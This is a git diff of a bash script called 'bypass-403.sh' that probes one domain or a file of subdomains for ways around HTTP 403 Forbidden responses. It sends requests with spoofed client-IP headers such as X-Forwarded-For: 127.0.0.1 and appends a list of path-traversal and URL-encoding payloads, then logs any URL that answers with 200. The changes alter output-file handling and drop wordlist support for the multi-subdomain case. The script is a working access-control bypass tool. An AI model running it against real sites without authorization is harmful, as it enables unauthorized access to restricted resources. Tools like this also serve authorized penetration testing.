@@ -1,14 +1,24 @@
 #!/bin/bash
 
-# Bypass-403-Forbidden-Error
+# Bypass-403-Forbidden-Error By Nea5her
 echo "                                               By Nea5her"
-echo "./bypass-403.sh <subdomain-file or single domain> [-w wordlist.txt | <single path>] [-o output.txt]"
+echo "./bypass-403.sh <subdomain-file or single domain> [-w wordlist.txt | <single path>] [-o output-file]"
 echo " "
 
 # Check if at least one argument is provided
 if [ "$#" -lt 1 ]; then
-    echo "Usage: $0 <subdomain-file or single domain> [-w wordlist.txt | <single path>] [-o output.txt]"
+    echo "Usage: $0 <subdomain-file or single domain> [-w wordlist.txt | <single path>] [-o output-file]"
     exit 1
+fi
+
+# Default output file
+output_file="200-outputs.txt"
+
+# Check if the output file option (-o) is provided and correctly handle it
+if [[ "$@" == *"-o"* ]]; then
+    # Extract the output file after the '-o' flag
+    output_file=$(echo "$@" | grep -oP "(?<=-o )\S+")
+    echo "Output will be saved to $output_file"
 fi
 
 # Determine if input is a file or a single domain
@@ -27,18 +37,10 @@ fi
 # Check if the second argument is a wordlist or a single path
 wordlist=""
 single_path=""
-output_file="200-outputs.txt"
 if [[ "$2" == "-w" ]]; then
     wordlist=$3
-elif [[ -n $2 ]]; then
+elif [[ -n $2 && "$2" != "-o" ]]; then
     single_path="/$2"  # Treat the second argument as a single path, prepend '/'
-fi
-
-# Handle optional output file argument
-if [[ "$4" == "-o" ]]; then
-    output_file=$5
-elif [[ "$3" == "-o" ]]; then
-    output_file=$4
 fi
 
 # Function to check bypass methods
@@ -49,7 +51,7 @@ check_bypass() {
     echo "Checking $domain$path"
 
     # Header-based bypass methods
-    headers=(
+    headers=( 
         "X-Originating-IP: 127.0.0.1"
         "X-Forwarded-For: 127.0.0.1"
         "X-Forwarded: 127.0.0.1"
@@ -66,15 +68,18 @@ check_bypass() {
 
     for header in "${headers[@]}"; do
         response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "$header" "$domain$path")
-        if [[ "$response" =~ ^200 ]]; then
-            echo -e "\033[0;32m  --> ${domain}${path} -H $header : $response\033[0m" | tee -a "$output_file"
+        
+        # Check for 200 status and save it
+        if [[ "$response" =~ "200" ]]; then
+            echo -e "\033[0;32m  --> ${domain}${path} -H $header : $response\033[0m"
+            echo "${domain}${path} -H $header : $response" >> "$output_file"
         else
             echo "  --> ${domain}${path} -H $header : $response"
         fi
     done
 
     # Payload-based bypass methods
-    payloads=(
+    payloads=( 
         "/*" "/%2f/" "/./" "/./." "/*/" "?" "??" "&" "#" "%" "%20" "%09"
         "/..;/" "/../" "/..%2f" "/..;/" "/.././" "/..%00/" "/..%0d" "/..%5c"
         "/..%ff/" "/%2e%2e%2f/" "/.%2e/" "/%3f" "%26" "%23" ".json"
@@ -82,8 +87,11 @@ check_bypass() {
 
     for payload in "${payloads[@]}"; do
         response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$domain$path$payload")
-        if [[ "$response" =~ ^200 ]]; then
-            echo -e "\033[0;32m  --> ${domain}${path}${payload} : $response\033[0m" | tee -a "$output_file"
+
+        # Check for 200 status and save it
+        if [[ "$response" =~ "200" ]]; then
+            echo -e "\033[0;32m  --> ${domain}${path}${payload} : $response\033[0m"
+            echo "${domain}${path}${payload} : $response" >> "$output_file"
         else
             echo "  --> ${domain}${path}${payload} : $response"
         fi
@@ -95,16 +103,8 @@ if [[ -n $input_file ]]; then
     # Case: Multiple subdomains from a file
     while IFS= read -r subdomain; do
         echo "-----------------------------"
-        if [[ -n $wordlist ]]; then
-            # If wordlist is provided, prepend '/' to each word and check each path for each subdomain
-            while IFS= read -r word; do
-                path="/$word"
-                check_bypass "$subdomain" "$path"
-            done < "$wordlist"
-        else
-            # No wordlist, check the root path
-            check_bypass "$subdomain" "/"
-        fi
+        # No wordlist provided, check the root path '/'
+        check_bypass "$subdomain" "/"
     done < "$input_file"
 else
     # Case: Single domain
